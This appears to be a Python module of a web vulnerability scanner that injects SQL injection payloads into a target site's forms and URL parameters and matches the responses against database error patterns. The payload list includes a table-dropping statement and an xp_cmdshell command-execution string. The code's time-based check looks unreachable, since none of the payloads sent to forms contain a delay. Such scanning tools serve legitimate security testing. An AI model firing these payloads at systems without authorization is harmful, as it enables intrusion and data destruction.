from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup
from .utils import Utils
import logging
import re

logger = logging.getLogger(__name__)

SQL_PAYLOADS = [
    "'",
    "''",
    "`",
    "``",
    ",",
    '"',
    "\\",
    "1 AND 1=1",
    "1 AND 1=2",
    "' OR '1'='1",
    "' OR '1'='2",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "admin'#",
    "' UNION SELECT NULL--",
    "1; DROP TABLE users--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1 UNION SELECT NULL,NULL--",
    "' AND SLEEP(5)--",
    "1; WAITFOR DELAY '0:0:5'--",
    "'; EXEC xp_cmdshell('dir')--",
]

SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"valid MySQL result",
    r"MySqlClient\.",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"Driver.*SQL[\-_ ]*Server",
    r"OLE DB.*SQL Server",
    r"(\W|\A)SQL Server.*Driver",
    r"Warning.*mssql_.*",
    r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
    r"Exception.*\WSystem\.Data\.SqlClient\.",
    r"Exception.*\WRoadhouse\.Cms\.",
    r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
    r"\[SQL Server\]",
    r"ODBC SQL Server Driver",
    r"ODBC Driver \d+ for SQL Server",
    r"SQLServer JDBC Driver",
    r"com\.jnetdirect\.jsql",
    r"macromedia\.jdbc\.sqlserver",
    r"Zend_Db_(Adapter|Statement)_Sqlsrv_Exception",
    r"com\.microsoft\.sqlserver\.jdbc",
    r"Pdo[./_\\]Mssql",
    r"SQL(Srv|Server)Exception",
    r"Unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"ORA-[0-9][0-9][0-9][0-9]",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*\Woci_.*",
    r"Warning.*\Wora_.*",
    r"CLI Driver.*DB2",
    r"DB2 SQL error",
    r"db2_\w+\(",
    r"SQLSTATE.+SQLCODE",
    r"Dynamic SQL Error",
    r"Warning.*ibase_.*",
    r"org\.firebirdsql\.jdbc",
    r"Sybase message",
    r"Warning.*sybase.*",
    r"Sybase.*Server message.*",
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*sqlite_.*",
    r"Warning.*SQLite3::",
    r"\[SQLITE_ERROR\]",
    r"SQL error.*POS([0-9]+)",
    r"Warning.*ingres_",
    r"Ingres SQLSTATE",
    r"Ingres\W.*Driver",
    r"Exception (condition )?\d+\. Transaction rollback\.",
    r"com\.frontbase\.jdbc",
    r"Unexpected end of command in statement \[",
    r"Unexpected token.*in statement \[",
    r"org\.hsqldb\.jdbc",
    r"org\.h2\.jdbc",
    r"H2 JDBC Driver",
    r"\[42000-192\]",
    r"An illegal character has been found in the statement",
    r"fbird_",
    r"ibase_",
    r"You have an error in your SQL syntax",
    r"Syntax error or access violation",
    r"Unclosed quotation mark",
    r"SQLSTATE\[",
    r"PDOException",
]


class SQLScanner:
    def __init__(self, utils: Utils, forms: list = None):
        self.utils = utils
        self.forms = forms or []
        self.findings = []

    def scan(self, progress_callback=None) -> list:
        if progress_callback:
            progress_callback("Scanning for SQL injection vulnerabilities...")

        self._scan_forms(progress_callback)
        self._scan_url_parameters(progress_callback)
        return self.findings

    def _scan_forms(self, progress_callback=None):
        for form in self.forms:
            if progress_callback:
                progress_callback(f"Testing SQL injection in form at: {form.get('url', '')}")

            action = form.get("action", "")
            method = form.get("method", "get")
            base_url = form.get("url", self.utils.target_url)
            target_url = self.utils.normalize_url(action, base_url) if action else base_url

            original_response = self.utils.get(target_url)
            original_text = original_response.text if original_response else ""

            for payload in SQL_PAYLOADS[:10]:
                form_data = {}
                for inp in form.get("inputs", []):
                    name = inp.get("name", "")
                    if not name:
                        continue
                    input_type = inp.get("type", "text").lower()
                    if input_type in ["text", "search", "email", "url", "password", ""]:
                        form_data[name] = payload
                    elif input_type == "hidden":
                        form_data[name] = inp.get("value", "")
                    else:
                        form_data[name] = inp.get("value", "1")

                if not form_data:
                    continue

                if method == "post":
                    response = self.utils.post(target_url, form_data)
                else:
                    response = self.utils.get(target_url, params=form_data)

                if response:
                    if self._check_sql_errors(response.text):
                        self.findings.append(
                            self.utils.create_finding(
                                vuln_type="SQL Injection",
                                severity="Critical",
                                title="SQL Injection Vulnerability (Error-Based)",
                                description="SQL error messages are exposed, indicating SQL injection vulnerability.",
                                url=target_url,
                                evidence=f"SQL error detected with payload: {payload[:100]}",
                                recommendation="Use parameterized queries/prepared statements. Never expose SQL errors to users.",
                            )
                        )
                        break

                    if self._check_time_based(payload, target_url, form_data, method):
                        self.findings.append(
                            self.utils.create_finding(
                                vuln_type="SQL Injection",
                                severity="Critical",
                                title="SQL Injection Vulnerability (Time-Based Blind)",
                                description="Time-based blind SQL injection detected.",
                                url=target_url,
                                evidence=f"Time delay detected with payload: {payload[:100]}",
                                recommendation="Use parameterized queries/prepared statements.",
                            )
                        )
                        break

                self.utils.rate_limit(0.5)

    def _scan_url_parameters(self, progress_callback=None):
        response = self.utils.get(self.utils.target_url)
        if not response:
            return

        soup = BeautifulSoup(response.text, "lxml")
        links_with_params = []

        for a_tag in soup.find_all("a", href=True):
            href = a_tag["href"]
            full_url = self.utils.normalize_url(href, self.utils.target_url)
            if full_url and "?" in full_url and self.utils.is_same_domain(full_url):
                links_with_params.append(full_url)

        for url in links_with_params[:10]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                if progress_callback:
                    progress_callback(f"Testing SQL injection in parameter: {param_name}")

                for payload in SQL_PAYLOADS[:5]:
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param_name] = payload
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

                    response = self.utils.get(test_url, params=test_params)
                    if response and self._check_sql_errors(response.text):
                        self.findings.append(
                            self.utils.create_finding(
                                vuln_type="SQL Injection",
                                severity="Critical",
                                title="SQL Injection in URL Parameter",
                                description=f"Parameter '{param_name}' is vulnerable to SQL injection.",
                                url=test_url,
                                evidence=f"Parameter: {param_name}, Payload: {payload[:100]}",
                                recommendation="Use parameterized queries. Validate and sanitize all input parameters.",
                            )
                        )
                        break
                    self.utils.rate_limit(0.5)

    def _check_sql_errors(self, response_text: str) -> bool:
        for pattern in SQL_ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def _check_time_based(
        self, payload: str, url: str, form_data: dict, method: str
    ) -> bool:
        if "SLEEP" not in payload.upper() and "WAITFOR" not in payload.upper():
            return False

        import time
        start_time = time.time()
        if method == "post":
            self.utils.post(url, form_data)
        else:
            self.utils.get(url, params=form_data)
        elapsed = time.time() - start_time
        return elapsed >= 4.5
